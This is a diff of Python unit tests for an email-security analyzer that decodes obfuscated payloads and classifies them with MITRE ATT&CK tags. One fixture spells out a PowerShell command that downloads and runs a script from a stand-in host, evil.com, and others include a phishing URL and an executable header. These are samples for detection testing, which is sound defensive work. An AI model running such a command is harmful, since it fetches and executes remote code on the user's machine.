@@ -138,9 +138,9 @@ class UrlIntelTests(unittest.TestCase):
         self.assertEqual(results_hex[0]["status"], "success")
         self.assertEqual(results_hex[0]["output"], "Hello World!")
 
-    @patch("analizador._decode_candidate_with_chepy")
-    def test_prefers_chepy_when_available(self, mock_chepy):
-        mock_chepy.return_value = ("payload decodificado por chepy", "Chepy (Base64)")
+    @patch("analizador._decode_candidate_raw")
+    def test_prefers_chepy_when_available(self, mock_decode):
+        mock_decode.return_value = (b"payload decodificado por chepy", "payload decodificado por chepy", "Chepy (Base64)")
         candidate = "U29tZSBtYWxpY2lvdXMgcGF5bG9hZA=="
         results = analizador.analyze_obfuscation(candidate)
         self.assertEqual(results[0]["status"], "success")
@@ -152,6 +152,66 @@ class UrlIntelTests(unittest.TestCase):
         results = analizador.analyze_obfuscation_with_cyberchef(candidate)
         self.assertEqual(results[0]["status"], "success")
         self.assertEqual(results[0]["output"], "Hola Mundo! test")
+
+    def test_classifies_hidden_url_as_malicious(self):
+        raw_bytes = b"https://evil-phishing.test/login"
+        decoded = "https://evil-phishing.test/login"
+        finding = analizador.classify_and_verify_payload(raw_bytes, decoded, "aHR0cHM6Ly9ldmlsLXBoaXNoaW5nLnRlc3QvbG9naW4=", "Chepy (Base64)")
+        self.assertEqual(finding["category"], "HIDDEN_URL")
+        self.assertEqual(finding["verdict"], "MALICIOSO")
+        self.assertFalse(finding["is_noise"])
+        self.assertIn("evil-phishing.test", finding["extracted_content"])
+        self.assertIn("MITRE T1027", finding["threat_type"])
+
+    def test_classifies_script_command_as_malicious(self):
+        raw_bytes = b"powershell.exe -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')"
+        decoded = raw_bytes.decode()
+        finding = analizador.classify_and_verify_payload(raw_bytes, decoded, "cG93ZXJzaGVsbC5leGU...", "Python nativo (Base64)")
+        self.assertEqual(finding["category"], "MALICIOUS_SCRIPT")
+        self.assertEqual(finding["verdict"], "MALICIOSO")
+        self.assertIn("T1059", finding["threat_type"])
+
+    def test_classifies_executable_binary_as_malicious(self):
+        raw_bytes = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
+        finding = analizador.classify_and_verify_payload(raw_bytes, raw_bytes.decode("utf-8", errors="replace"), "TVqQAAMAAAAEAAAA//8A", "Chepy (Base64)")
+        self.assertEqual(finding["category"], "BINARY_PAYLOAD")
+        self.assertEqual(finding["verdict"], "MALICIOSO")
+        self.assertIn("Ejecutable", finding["label"])
+
+    def test_classifies_tracking_token_as_innocuous_noise(self):
+        # bu4677hunB... token de telemetría de sample-10000.eml
+        token = "bu4677hunB4wXUcEimxr31tw65rV9tqt"
+        results = analizador.analyze_obfuscation(token)
+        self.assertTrue(len(results) >= 1)
+        self.assertEqual(results[0]["category"], "TRACKING_TOKEN")
+        self.assertEqual(results[0]["verdict"], "INOCUO")
+        self.assertTrue(results[0]["is_noise"])
+
+    def test_security_evaluation_incorporates_deobfuscation_threats(self):
+        mock_data = {
+            "from_domain": "legit.com",
+            "from_name": "Admin",
+            "spf_result": "pass",
+            "spf_domain": "legit.com",
+            "dkim_result": "pass",
+            "dkim_domain": "legit.com",
+            "dmarc_result": "pass",
+            "dmarc_domain": "legit.com",
+            "reply_to_domain": "legit.com",
+            "links": [],
+            "subject": "Hola",
+            "body": "Cuerpo limpio",
+        }
+        deobf_malicious = [{
+            "category": "HIDDEN_URL",
+            "label": "Enlace Oculto (URL Phishing)",
+            "verdict": "MALICIOSO",
+            "threat_type": "Evasión de Filtro Antispam / Phishing Encubierto (MITRE T1027)",
+            "forensic_interpretation": "El correo ocultó una URL en Base64.",
+        }]
+        eval_result = analizador.evaluate_email_security(mock_data, deobfuscation_results=deobf_malicious)
+        self.assertIn("Evasión de Defensas / Contenido Ofuscado (MITRE T1027)", eval_result["threat_types"])
+        self.assertGreaterEqual(eval_result["score"], 35)
     def test_analyzes_http_links_with_all_services(self):
         responses = [
             {"uuid": "scan-123", "result": "https://urlscan.io/result/scan-123/"},
